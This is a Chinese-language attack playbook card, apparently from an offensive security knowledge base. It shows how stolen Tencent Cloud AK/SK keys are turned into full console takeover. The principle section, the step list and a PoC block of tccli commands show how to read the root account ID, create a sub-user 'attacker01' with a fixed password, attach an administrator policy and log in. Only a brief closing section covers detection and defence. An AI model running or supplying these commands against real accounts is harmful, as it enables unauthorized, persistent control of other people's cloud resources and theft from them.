---
id: cloud-cloud-iam-tencent-cam-subuser-console-takeover
title: 腾讯云 AK/SK 经 tccli CAM 创建管理员子用户并登录控制台接管
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: tencent-cam-subuser-console-takeover
aliases:
- 腾讯云 AK/SK 接管
- tccli cam AddUser
- 腾讯云子用户登录
- CAM 创建子用户
- 腾讯云控制台接管
tags:
- cloud
- tencent-cloud
- cloud-iam
- cam
- credential
- persistence
- console-takeover
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V569
  verified_at: '2026-11-12T09:40:41+08:00'
  notes: 已对照原文与截图05-09核对：图05 腾讯云新建子用户文档、图06/07 tccli cam GetUserAppId 返回 Uin/OwnerUin/AppId、图08 子用户登录页需主账号ID+子用户名+密码、图09 登录后进入腾讯云控制台；tccli cam AddUser（ConsoleLogin/Password/NeedResetPassword）、ListPolicies、AttachUserPolicy PolicyId 1、ListUsers 命令均与原文一致。修正：原文 AttachUserPolicy --AttachUin 100035117703 未标明来源，按 CAM API 语义 AttachUin 为子用户 Uin（AddUser 响应/ListUsers 获取），卡内原注释误写为主账号Uin，已在步骤3/5与PoC修正并注明；检测项中阿里云 API CreateLoginProfile 已替换为腾讯侧 AddUser(ConsoleLogin=1)；不确定的 QcloudAllPrivilege 示例已移除。云服务无版本概念，affected_versions 保持 null。未实测 tccli 调用与登录。
---

## 一句话结论

拿到腾讯云高权限 AK/SK 后，用官方 `tccli cam GetUserAppId` 取主账号 ID，再用 `tccli cam AddUser` 创建带控制台登录密码的子用户、`AttachUserPolicy` 绑定管理员策略，最后在子用户登录页用"主账号 ID + 子用户名 + 密码"登录，即可从 API 凭证升级为可长期使用的云控制台接管。

## 原理

- **AK/SK 即 API 身份**：腾讯云 API 密钥可调用 CAM（访问管理）接口；若密钥所属账号具备 CAM 用户管理与策略绑定权限，就能通过公开 API 派生一个攻击者掌握密码的子用户。
- **控制台登录的前提**：与阿里云不同，腾讯云子用户登录需要**主账号 ID**（Uin/AppId）作为登录凭据的一部分；`tccli cam GetUserAppId` 直接返回当前凭证所属主账号的 `Uin`/`OwnerUin`/`AppId`，解决"不知道主账号 ID 无法登录"的问题。
- **创建与授权**：`AddUser` 的 `--ConsoleLogin 1 --Password ... --NeedResetPassword 0` 直接开通控制台登录并设置固定密码；`ListPolicies` 查出系统策略（如 `AdministratorAccess`）的 `PolicyId`，`AttachUserPolicy` 把该策略绑定给新子用户，子用户即拥有与主账号等价的管理权限。
- **为什么成立**：创建用户、设置登录配置、绑定策略都是合法的 CAM API，不需要原账号密码或 MFA；只要 AK/SK 权限足够，整个接管过程完全在 API 层完成，且新建子用户是长期凭证，不随原密钥轮换立即失效。

## 触发条件

- 已获得有效的腾讯云 AK/SK（泄露、元数据、前端 JS 等来源），且关联账号具备 CAM 用户管理/策略绑定权限（高权账号或 `QcloudCamFullAccess`）；
- 账号未对"创建子用户/绑定管理员策略"设置告警阻断或最小权限约束；
- 攻击者可访问腾讯云公网 API 与控制台（`console.cloud.tencent.com`）。

## 利用步骤

1. 用 `tccli configure` 导入 AK/SK（或 `--secretId/--secretKey` 直接调用）。
2. `tccli cam GetUserAppId --cli-unfold-argument` 获取主账号 `Uin`/`AppId`（登录页需要）。
3. `tccli cam AddUser --cli-unfold-argument --Name <子用户名> --Remark <备注> --ConsoleLogin 1 --Password '<密码>' --NeedResetPassword 0` 创建子用户，响应中的 `Uin` 即新子用户的 Uin（绑定策略要用）。
4. `tccli cam ListPolicies --cli-unfold-argument` 找到管理员策略（如 `AdministratorAccess`）的 `PolicyId`。
5. `tccli cam AttachUserPolicy --cli-unfold-argument --PolicyId <PolicyId> --AttachUin <子用户Uin>` 绑定策略（AttachUin 是子用户 Uin，取自 AddUser 响应或 ListUsers，不是主账号 Uin）。
6. `tccli cam ListUsers --cli-unfold-argument` 确认子用户存在。
7. 打开腾讯云"子用户登录"页，输入主账号 ID、子用户名与密码登录，进入控制台接管资产（CVM/轻量/COS/域名等）。

## PoC

```bash
# 配置凭证
tccli configure

# 获取主账号 ID（登录页需要）
tccli cam GetUserAppId --cli-unfold-argument

# 创建可登录控制台的子用户
tccli cam AddUser --cli-unfold-argument --Name attacker01 --Remark ops \
  --ConsoleLogin 1 --Password 'P@ssw0rd123' --NeedResetPassword 0

# 查询策略并绑定管理员权限
tccli cam ListPolicies --cli-unfold-argument
tccli cam AttachUserPolicy --cli-unfold-argument --PolicyId 1 --AttachUin <子用户Uin>

# 确认
tccli cam ListUsers --cli-unfold-argument
```

## 变体与关联

- 变体：若 `PolicyId 1` 不是 AdministratorAccess，用 `ListPolicies` 按名称筛选（如 `QcloudCamFullAccess`，以 ListPolicies 实际返回为准）再绑定；也可创建用户组、把子用户加入管理员组。
- 关联：华为云 AKSK→IAM 子账户同场景 [[huawei-obs-aksk-iam-console-takeover]]；阿里云 CF/官方 CLI 创建 RAM 用户 [[cloud-cloud-iam-aliyun-temp-credential-cf-console-takeover]]；腾讯云临时凭证 CVM 密码重置 [[cloud-cloud-iam-tencent-temp-credential-cvm-password-reset]]（不同链：重置已有实例密码而非创建子用户）。
- 变体：AK/SK 权限不足 CAM 时，退回列权（DescribeInstances/ListBuckets）与资源读取，或寻找其它可持久化原语。

## 检测与防御

- 检测：CAM 审计日志中的 `AddUser`（尤其带 ConsoleLogin=1）、`AttachUserPolicy`、`UpdateUser` 等敏感 API 调用；新子用户创建后立即绑管理员策略的行为；控制台异地/新设备登录。
- 防御：AK/SK 最小权限与定期轮换；禁用长期密钥、改用角色临时凭证；对 CAM 写操作启用 MFA 与告警阻断；监控并限制高权策略（AdministratorAccess）绑定；发现可疑子用户立即禁用并审计其操作。
